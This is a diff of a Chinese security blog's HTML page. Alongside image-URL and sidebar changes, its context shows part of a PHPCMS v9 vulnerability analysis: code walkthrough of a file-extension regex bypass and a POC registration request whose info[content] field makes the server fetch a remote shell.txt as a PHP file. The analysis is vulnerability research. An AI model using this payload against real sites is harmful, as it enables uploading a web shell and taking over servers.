@@ -472,13 +472,13 @@ height:50vh;
 <p>接下来看到这串正则：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match_all(&quot;/(href|src)=([\&quot;|&apos;]?)([^ \&quot;&apos;&gt;]+\.($ext))\\2/i&quot;, $string, $matches)) return $value;</span><br></pre></td></tr></table></figure>
 <p>作用就是检测后缀名，如果不是<code>gif|jpg|jpeg|bmp|png</code>格式的，就是返回原url，直接退出。这边可以直接绕过：</p>
-<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-phpcms1.png" alt="phpcms1"></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/phpcms1.png" alt="phpcms1"></p>
 <p>继续向下，看到：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($matches[<span class="number">3</span>] <span class="keyword">as</span> $matche)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(strpos($matche, <span class="string">'://'</span>) === <span class="keyword">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">			dir_create($uploaddir);</span><br><span class="line">			$remotefileurls[$matche] = <span class="keyword">$this</span>-&gt;fillurl($matche, $absurl, $basehref);</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
 <p>这里的<code>$matches[3]</code>就是<code>http://127.0.0.1/shell.txt.php.jpg</code></p>
 <p>又经过了<code>fillurl</code>方法的处理，跟进去看一下，看到关键的地方：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$BaseUrlPath = preg_replace(<span class="string">"/\/([^\/]*)\.(.*)$/"</span>,<span class="string">'/'</span>,$BaseUrlPath);</span><br><span class="line">$BaseUrlPath = preg_replace(<span class="string">"/\/$/"</span>,<span class="string">''</span>,$BaseUrlPath);</span><br><span class="line">$pos = strpos($surl,<span class="string">'#'</span>);</span><br><span class="line"><span class="keyword">if</span>($pos&gt;<span class="number">0</span>) $surl = substr($surl,<span class="number">0</span>,$pos);</span><br></pre></td></tr></table></figure>
-<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-phpcms2.png" alt="phpcms2"></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/phpcms2.png" alt="phpcms2"></p>
 <p><code>$BaseUrlPath=&#39;/127.0.0.1/shell.txt.php.jpg&#39;</code></p>
 <p>下一个正则将<code>/</code>去掉，以方便后面的操作：</p>
 <p><code>$BaseUrlPath=&#39;127.0.0.1shell.txt.php.jpg&#39;</code></p>
@@ -506,11 +506,11 @@ height:50vh;
 <p>回到<code>register</code>方法中，向下看：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(pc_base::load_config(<span class="string">'system'</span>, <span class="string">'phpsso'</span>)) &#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;_init_phpsso();</span><br><span class="line">				$status = <span class="keyword">$this</span>-&gt;client-&gt;ps_member_register($userinfo[<span class="string">'username'</span>], $userinfo[<span class="string">'password'</span>], $userinfo[<span class="string">'email'</span>], $userinfo[<span class="string">'regip'</span>], $userinfo[<span class="string">'encrypt'</span>]);</span><br><span class="line">				<span class="keyword">if</span>($status &gt; <span class="number">0</span>) &#123;</span><br><span class="line">					$userinfo[<span class="string">'phpssouid'</span>] = $status;</span><br><span class="line">					<span class="comment">//传入phpsso为明文密码，加密后存入phpcms_v9</span></span><br><span class="line">					$password = $userinfo[<span class="string">'password'</span>];</span><br><span class="line">					$userinfo[<span class="string">'password'</span>] = password($userinfo[<span class="string">'password'</span>], $userinfo[<span class="string">'encrypt'</span>]);</span><br><span class="line">					$userid = <span class="keyword">$this</span>-&gt;db-&gt;insert($userinfo, <span class="number">1</span>);</span><br><span class="line">					<span class="keyword">if</span>($member_setting[<span class="string">'choosemodel'</span>]) &#123;	<span class="comment">//如果开启选择模型</span></span><br><span class="line">						$user_model_info[<span class="string">'userid'</span>] = $userid;</span><br><span class="line">						<span class="comment">//插入会员模型数据</span></span><br><span class="line">						<span class="keyword">$this</span>-&gt;db-&gt;set_model($userinfo[<span class="string">'modelid'</span>]);</span><br><span class="line">						<span class="keyword">$this</span>-&gt;db-&gt;insert($user_model_info);</span><br><span class="line">					&#125;</span><br></pre></td></tr></table></figure>
 <p>也就是说会将<code>$userid</code>加入<code>$user_model_info</code>数组中再进行数据库的插入操作（会员新增操作，对应的v9_member_detail数据表）:</p>
-<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-phpcms3.png" alt="phpcms3"></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/phpcms3.png" alt="phpcms3"></p>
 <p>只有两个字段，<code>userid</code>与<code>birthday</code>。但由于$user_model_info数组已经包含了我们之前构造提交的info[content]=xxxxxx的内容，而在插入数据库的时候又没有content字段，所以会导致数据库报错，从而将我们构造的xxxxxx的内容给回显出来，所以就不用暴力去破解文件名了。</p>
 <h3 id="3-POC解释"><a href="#3-POC解释" class="headerlink" title="3. POC解释"></a>3. POC解释</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">siteid=1&amp;modelid=1&amp;username=123456&amp;password=123456&amp;email=123456@qq.com&amp;info[content]=&lt;img src=http://127.0.0.1/shell.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=</span><br></pre></td></tr></table></figure>
 <p>?后的<code>.php</code>被当做shell.txt的参数，所以复制的是shell.txt的内容。</p>
-<h1 id="0x03-diff比较"><a href="#0x03-diff比较" class="headerlink" title="0x03 diff比较"></a>0x03 diff比较</h1><p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-phpcms4.png" alt="phpcms4"></p>
+<h1 id="0x03-diff比较"><a href="#0x03-diff比较" class="headerlink" title="0x03 diff比较"></a>0x03 diff比较</h1><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/phpcms4.png" alt="phpcms4"></p>
 <p>简单粗暴的对处理后的文件后缀进行检测。</p>
 <h1 id="0x04-修补方案"><a href="#0x04-修补方案" class="headerlink" title="0x04 修补方案"></a>0x04 修补方案</h1><p>更新吧</p>
 <h1 id="0x05-最后吐槽一句"><a href="#0x05-最后吐槽一句" class="headerlink" title="0x05 最后吐槽一句"></a>0x05 最后吐槽一句</h1><p>顺便把phpcms的源码看了一下，发现phpcms对于安全性的验证真的是简单粗暴，只要是个交互的地方就要调一遍过滤函数，这样死板的做法，可能在安全上会有一些益处，但是势必会对以后的扩展造成阻碍。</p>
@@ -933,6 +933,64 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
         Total : 21
@@ -952,6 +1010,11 @@ top:50vh;
     
     <div class="archive-year"> 2018 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/29</span><a class="archive-post-title" href= "/2018/11/29/JBoss RichFaces Unserialize+EL=RCE Analysis（CVE-2018-14667）/" >JBoss RichFaces Unserialize+EL=RCE Analysis（CVE-2018-14667）</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1071,19 +1134,10 @@ top:50vh;
             <span class="archive-post-date">08/09</span><a class="archive-post-title" href= "/2016/08/09/IPS Community Suite 自动加载的PHP代码注入漏洞（CVE-2016-6174）/" >IPS Community Suite 自动加载的PHP代码注入漏洞（CVE-2016-6174）</a>
         </li>
     
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">07/01</span><a class="archive-post-title" href= "/2016/07/01/Discuz 3.2 利用ssrf+缓存应用getshell漏洞（附pocsuite）/" >Discuz 3.2 利用ssrf+缓存应用getshell漏洞（附pocsuite）</a>
-        </li>
-    
     </div>
   </div>
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
-    
-        <span class="sidebar-tag-name" data-tags="黑产研究"><span class="iconfont-archer">&#xe606;</span>黑产研究</span>
-    
-        <span class="sidebar-tag-name" data-tags="BlackHat SEO"><span class="iconfont-archer">&#xe606;</span>BlackHat SEO</span>
     
         <span class="sidebar-tag-name" data-tags="漏洞分析"><span class="iconfont-archer">&#xe606;</span>漏洞分析</span>
     
@@ -1093,19 +1147,25 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="环境部署"><span class="iconfont-archer">&#xe606;</span>环境部署</span>
     
-        <span class="sidebar-tag-name" data-tags="安全研究"><span class="iconfont-archer">&#xe606;</span>安全研究</span>
-    
-        <span class="sidebar-tag-name" data-tags="Joomla"><span class="iconfont-archer">&#xe606;</span>Joomla</span>
-    
-        <span class="sidebar-tag-name" data-tags="CookBook"><span class="iconfont-archer">&#xe606;</span>CookBook</span>
-    
-        <span class="sidebar-tag-name" data-tags="SQL注入"><span class="iconfont-archer">&#xe606;</span>SQL注入</span>
-    
         <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
     
         <span class="sidebar-tag-name" data-tags="blockchain"><span class="iconfont-archer">&#xe606;</span>blockchain</span>
     
+        <span class="sidebar-tag-name" data-tags="黑产研究"><span class="iconfont-archer">&#xe606;</span>黑产研究</span>
+    
         <span class="sidebar-tag-name" data-tags="薅羊毛"><span class="iconfont-archer">&#xe606;</span>薅羊毛</span>
+    
+        <span class="sidebar-tag-name" data-tags="BlackHat SEO"><span class="iconfont-archer">&#xe606;</span>BlackHat SEO</span>
+    
+        <span class="sidebar-tag-name" data-tags="安全研究"><span class="iconfont-archer">&#xe606;</span>安全研究</span>
+    
+        <span class="sidebar-tag-name" data-tags="Joomla"><span class="iconfont-archer">&#xe606;</span>Joomla</span>
+    
+        <span class="sidebar-tag-name" data-tags="Java"><span class="iconfont-archer">&#xe606;</span>Java</span>
+    
+        <span class="sidebar-tag-name" data-tags="CookBook"><span class="iconfont-archer">&#xe606;</span>CookBook</span>
+    
+        <span class="sidebar-tag-name" data-tags="SQL注入"><span class="iconfont-archer">&#xe606;</span>SQL注入</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
@@ -1140,19 +1200,19 @@ jsonContent:
         <div class="sidebar-panel-categories">
     <div class="sidebar-categories-name">
     
-        <span class="sidebar-category-name" data-categories="黑产研究"><span class="iconfont-archer">&#xe60a;</span>黑产研究</span>
-    
         <span class="sidebar-category-name" data-categories="漏洞分析"><span class="iconfont-archer">&#xe60a;</span>漏洞分析</span>
     
         <span class="sidebar-category-name" data-categories="环境部署"><span class="iconfont-archer">&#xe60a;</span>环境部署</span>
     
-        <span class="sidebar-category-name" data-categories="安全研究"><span class="iconfont-archer">&#xe60a;</span>安全研究</span>
-    
-        <span class="sidebar-category-name" data-categories="技术总结"><span class="iconfont-archer">&#xe60a;</span>技术总结</span>
-    
         <span class="sidebar-category-name" data-categories="一些思路"><span class="iconfont-archer">&#xe60a;</span>一些思路</span>
     
         <span class="sidebar-category-name" data-categories="blockchain"><span class="iconfont-archer">&#xe60a;</span>blockchain</span>
+    
+        <span class="sidebar-category-name" data-categories="黑产研究"><span class="iconfont-archer">&#xe60a;</span>黑产研究</span>
+    
+        <span class="sidebar-category-name" data-categories="安全研究"><span class="iconfont-archer">&#xe60a;</span>安全研究</span>
+    
+        <span class="sidebar-category-name" data-categories="技术总结"><span class="iconfont-archer">&#xe60a;</span>技术总结</span>
     
     </div>
     <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
